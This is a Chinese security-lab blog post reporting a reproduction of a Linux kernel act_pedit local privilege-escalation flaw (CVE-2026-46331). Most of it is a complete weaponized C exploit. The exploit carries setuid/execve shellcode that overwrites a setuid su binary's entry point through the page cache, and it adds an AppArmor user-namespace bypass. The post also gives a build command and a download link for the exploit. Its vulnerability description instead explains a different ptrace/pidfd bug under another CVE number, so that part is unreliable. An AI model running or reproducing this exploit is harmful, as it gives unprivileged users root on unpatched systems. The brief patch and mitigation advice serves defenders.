---
cve: "CVE-2026-46331"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  【成功复现】Linux内核act_pedit本地权限提升漏洞(CVE-2026-46331)  
原创 弥天安全实验室
                    弥天安全实验室  弥天安全实验室   2026-06-20 02:32  
  
#   
  
网安引领时代，弥天点亮未来    
   
  
  
  
  
  
   
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=2jntd263&tp=webp#imgIndex=0 "")  
  
  
**0x00写在前面**  
  
**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=7c3v7kvq&tp=webp#imgIndex=1 "")  
  
  
**0x01漏洞介绍**  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YfTkN0R6oGg3HLSRomLgQ4qMlt2zg8y2RWbYH30IWFnk5xqVxCFhxCvTgOBKib97nSBUDbKW9EAl9Oa3OycyunezCgQVUHQ6mjhl2OibicSpVk/640?wx_fmt=png&from=appmsg "")  
  
  
Linux kernel是美国Linux基金会的开源操作系统Linux所使用的内核。  
  
Linux kernel存在安全漏洞，该漏洞源于ptrace的get_dumpable逻辑处理不当，可能导致权限检查问题。CVE-2026-46333漏洞也成为"ssh-keysign-pwn"。  
  
Linux内核__ptrace_may_access()函数存在逻辑缺陷：当目标进程的task->mm指针为NULL时（即内核调用 exit_mm() 后），会完全跳过 dumpable安全检查。由于do_exit()的执行顺序是先清空mm指针再关闭文件描述符，攻击者可利用pidfd_getfd() 系统调用在mm=NULL但文件描述符仍存在的极短时间窗口内，窃取setuid程序打开的敏感文件描述符（如 /etc/shadow 或 SSH 私钥），从而以普通用户权限读取root拥有的任意文件，实现本地权限提升。  
  
  
****  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=bzequ3sx&tp=webp#imgIndex=3 "")  
  
  
**0x02影响版本**  
  
  
1. v5.18 <= Linux Kernel < v7.1-rc7现在已知受影响发行版本：2. RHEL 10.0（内核 6.12.0-228.el10）3. Debian 13 trixie（内核 6.12.90+deb13.1）4. Ubuntu 24.04.4（内核 6.17.0-22）  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=bzequ3sx&tp=webp#imgIndex=5 "")  
  
  
**0x03漏洞复现**  
  
  
1.连接环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YfTkN0R6oGia054NlN46Wia7Tw3NqVczhh0lwFgjoRuic5vA5cAnGkDXRbETY3oydxsNZs3iaib8lf7hbbbCeOsEVBCicGniaFiaPTrPEDNOOLnt0rg/640?wx_fmt=png&from=appmsg "")  
  
2.漏洞复现  
  
上传漏洞利用exp，进行编译  
```
gcc -O2 -Wall -static packet_edit_meme.c pedit_primitive.c -o packet_edit_meme
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGiadEqSfoZqPUyrdBiaiciagBjIDDaBGjGticyoQLkAjslWDcibsnGsHIibehUftJLCBsgib6LDwHcxHhfN9lUlk9LvicyOwEMjY0esic20c/640?wx_fmt=png&from=appmsg "")  
  
执行编译后的文件，成功本地提权到root  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YfTkN0R6oGhzkZXsZD5yBzbaicmhfHK4K7vhv1ZWabRyfCUhDDWXlcDxqGGoONhxLD6QSTMxGORCoHpiaK7VLicY8ibfcxQM3rVOjMd5ubMS4Ds/640?wx_fmt=png&from=appmsg "")  
  
漏洞利用c代码  
```
/*
 * packet_edit_meme.c -- CVE-2026-46331 weaponized: unprivileged local root.
 *
 * The tc-pedit page-cache write primitive overwrites the ELF entry point of a
 * setuid-root su (in the shared page cache) with a small setuid(0)+execve("/bin/sh")
 * shellcode. CAP_NET_ADMIN for the primitive is obtained unprivileged by a child
 * that unshare()s a user+net namespace; the parent stays in the init user namespace
 * and exec()s su, so the setuid bit makes it euid 0 globally and the corrupted
 * cached page runs the shellcode as real root.
 *
 * Shellcode is pure x86_64 syscalls (setuid=105, execve=59) -- the syscall ABI is
 * frozen, so it runs unchanged on any 5.x / 6.x / 7.x kernel. The bug itself spans
 * v5.18 .. v7.1-rc6.
 *
 * Build: x86_64-linux-gnu-gcc -O2 -Wall -static packet_edit_meme.c pedit_primitive.c
 * Run from an unprivileged user. Default path is a plain unshare(); on
 * AppArmor-restricted Ubuntu pass --ubuntu to transition via aa-exec into a
 * userns-permitting profile (trinity/chrome/flatpak) first.
 */
#define _GNU_SOURCE
#include "pedit_primitive.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <elf.h>
#include <sys/stat.h>
#include <sys/wait.h>

#define SHELLCODE_PAD       0x90

/* x86_64: setgid(0); setuid(0); execve("/bin/sh", {"/bin/sh", NULL}, NULL). 48 bytes (% PEDIT_SLOT). */
static const unsigned char SHELLCODE[] = {
    0x31, 0xff,                                                 /* xor    edi, edi          */
    0xb8, 0x6a, 0x00, 0x00, 0x00,                               /* mov    eax, 106 (setgid) */
    0x0f, 0x05,                                                 /* syscall                  */
    0xb8, 0x69, 0x00, 0x00, 0x00,                               /* mov    eax, 105 (setuid) */
    0x0f, 0x05,                                                 /* syscall (rdi still 0)    */
    0x48, 0x31, 0xd2,                                           /* xor    rdx, rdx          */
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, /* movabs rbx, "/bin/sh"    */
    0x53,                                                       /* push   rbx               */
    0x48, 0x89, 0xe7,                                           /* mov    rdi, rsp          */
    0x52,                                                       /* push   rdx (argv NULL)   */
    0x57,                                                       /* push   rdi ("/bin/sh")   */
    0x48, 0x89, 0xe6,                                           /* mov    rsi, rsp (argv)   */
    0xb8, 0x3b, 0x00, 0x00, 0x00,                               /* mov    eax, 59 (execve)  */
    0x0f, 0x05,                                                 /* syscall                  */
    SHELLCODE_PAD, SHELLCODE_PAD, SHELLCODE_PAD,                /* pad to a whole slot      */
};

static const char *SU_PATHS[] = {
    "/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su", NULL,
};

static const char *find_su(void)
{
    struct stat info;
    int index;

    for (index = 0; SU_PATHS[index]; index++) {
        if (stat(SU_PATHS[index], &info) == 0 && S_ISREG(info.st_mode) &&
            (info.st_mode & S_ISUID) && info.st_uid == 0)
            return SU_PATHS[index];
    }
    return NULL;
}

/* Return the file offset of e_entry via the executable PT_LOAD that contains it. */
static long elf_entry_offset(int fd)
{
    Elf64_Ehdr ehdr;
    Elf64_Phdr phdr;
    int index;

    if (pread(fd, &ehdr, sizeof(ehdr), 0) != (ssize_t)sizeof(ehdr))
        return -1;
    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0 || ehdr.e_ident[EI_CLASS] != ELFCLASS64)
        return -1;
    for (index = 0; index < ehdr.e_phnum; index++) {
        off_t at = ehdr.e_phoff + (off_t)index * ehdr.e_phentsize;

        if (pread(fd, &phdr, sizeof(phdr), at) != (ssize_t)sizeof(phdr))
            return -1;
        if (phdr.p_type == PT_LOAD && (phdr.p_flags & PF_X) &&
            ehdr.e_entry >= phdr.p_vaddr && ehdr.e_entry < phdr.p_vaddr + phdr.p_filesz)
            return (long)(ehdr.e_entry - phdr.p_vaddr + phdr.p_offset);
    }
    return -1;
}

static void write_proc_file(const char *path, const char *value)
{
    int fd = open(path, O_WRONLY);

    if (fd >= 0) {
        if (write(fd, value, strlen(value)) < 0) {
            /* best effort */
        }
        close(fd);
    }
}

/* Runs in the unshare()d child: map to uid 0, then write the shellcode over su's
 * entry, slot by slot, through the page-cache primitive. */
static int corrupt_entry(int su_fd, long entry_offset)
{
    char map_line[64];
    uid_t uid = getuid();
    gid_t gid = getgid();
    size_t written = 0;

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET)) {
        perror("unshare");
        return -1;
    }
    write_proc_file("/proc/self/setgroups", "deny");
    snprintf(map_line, sizeof(map_line), "0 %u 1", uid);
    write_proc_file("/proc/self/uid_map", map_line);
    snprintf(map_line, sizeof(map_line), "0 %u 1", gid);
    write_proc_file("/proc/self/gid_map", map_line);

    if (setup())
        return -1;
    while (written < sizeof(SHELLCODE)) {
        size_t chunk = sizeof(SHELLCODE) - written;

        if (chunk > PEDIT_MAX_WRITE)
            chunk = PEDIT_MAX_WRITE;
        if (api_fd_write(su_fd, entry_offset + written, SHELLCODE + written, chunk))
            return -1;
        written += chunk;
    }
    return 0;
}

static int run_exploit(void)
{
    const char *su_path;
    char *su_argv[2];
    int su_fd;
    int sync_pipe[2];
    long entry_offset;
    pid_t child;
    int status;
    char ack = 0;

    su_path = find_su();
    if (!su_path) {
        fprintf(stderr, "[-] no setuid-root su found\n");
        return 1;
    }
    su_fd = open(su_path, O_RDONLY);
    if (su_fd < 0) {
        perror("open su");
        return 1;
    }
    entry_offset = elf_entry_offset(su_fd);
    if (entry_offset < 0) {
        fprintf(stderr, "[-] could not locate su entry point\n");
        return 1;
    }
    printf("[*] target %s as uid %d; entry at file offset 0x%lx; shellcode %zu bytes\n",
           su_path, (int)getuid(), entry_offset, sizeof(SHELLCODE));

    /* corruptor child gets CAP_NET_ADMIN via userns; the page cache is global so the
     * overwrite is visible to our later exec() in the init user namespace. */
    if (pipe(sync_pipe)) {
        perror("pipe");
        return 1;
    }
    child = fork();
    if (child < 0) {
        perror("fork");
        return 1;
    }
    if (child == 0) {
        close(sync_pipe[0]);
        if (corrupt_entry(su_fd, entry_offset))
            _exit(1);
        if (write(sync_pipe[1], "1", 1) != 1)
            _exit(1);
        _exit(0);
    }
    close(sync_pipe[1]);
    if (read(sync_pipe[0], &ack, 1) != 1)
        ack = 0;
    waitpid(child, &status, 0);
    if (ack != '1' || !WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        fprintf(stderr, "[-] page-cache corruption failed\n");
        return 1;
    }
    printf("[+] su entry overwritten; exec'ing su -> interactive root shell\n");

    /* exec su keeping our own stdin/stdout/stderr (the caller's tty), so the
     * shellcode's /bin/sh is an interactive root shell that stays open. */
    su_argv[0] = (char *)su_path;
    su_argv[1] = NULL;
    execve(su_path, su_argv, NULL);
    perror("execve su");
    return 1;
}

/* --ubuntu: on AppArmor-restricted Ubuntu the unconfined userns is denied, so
 * re-exec under a permissive profile via aa-exec; the corruptor's plain
 * unshare(NEWUSER) is then allowed. Tries each profile; on a rooted run the child
 * exits 0 and we stop. The default (no flag) path stays a plain unshare. */
static const char *AA_PROFILES[] = { "trinity", "chrome", "flatpak", NULL };

static void apparmor_userns_bypass(char *self)
{
    int index;
    pid_t pid;
    int status;

    for (index = 0; AA_PROFILES[index]; index++) {
        pid = fork();
        if (pid < 0)
            return;
        if (pid == 0) {
            execlp("aa-exec", "aa-exec", "-p", AA_PROFILES[index], "--", self, "--in-profile", (char *)NULL);
            _exit(127);
        }
        if (waitpid(pid, &status, 0) == pid && WIFEXITED(status) && WEXITSTATUS(status) == 0)
            exit(0);
    }
}

int main(int argc, char **argv)
{
    /* must be launched as the target unprivileged user (e.g. `su - user -c ...`),
     * which sets the credentials -- this binary does not drop privileges itself. */
    if (getuid() == 0) {
        fprintf(stderr, "[-] run me as an unprivileged user, not root\n");
        return 1;
    }
    if (argc >= 2 && strcmp(argv[1], "--ubuntu") == 0) {
        apparmor_userns_bypass(argv[0]);    /* re-exec under a permissive profile */
        fprintf(stderr, "[-] --ubuntu: no usable aa-exec profile (trinity/chrome/flatpak)\n");
        return 1;
    }
    return run_exploit();                    /* default + the post-aa-exec re-exec */
}

```  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=bzequ3sx&tp=webp#imgIndex=3 "")  
  
  
**0x04修复建议**  
  
  
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：  
  
临时缓解方案  
  
临时禁用act_pedit内核模块  
  
  
建议尽快升级修复漏洞，再次声明本文仅供学习使用，非法他用责任自负！     
```
https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=899ee91156e57784090c5565e4f31bd7dbffbc5a
https://codeload.github.com/sgkdev/packet_edit_meme/zip/refs/heads/main
```  
  
  
弥天简介  
  
学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。  
  
口号 网安引领时代，弥天点亮未来  
  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&randomid=h6lqq1ue&tp=webp#imgIndex=8 "")  
  
   
  
  
知识分享完了  
  
喜欢别忘了关注我们哦~  
  
学海浩茫，  
  
予以风动，  
  
必降弥天之润！  
  
  
   弥  天  
  
安全实验室  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=u34b870m&tp=webp#imgIndex=9 "")  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
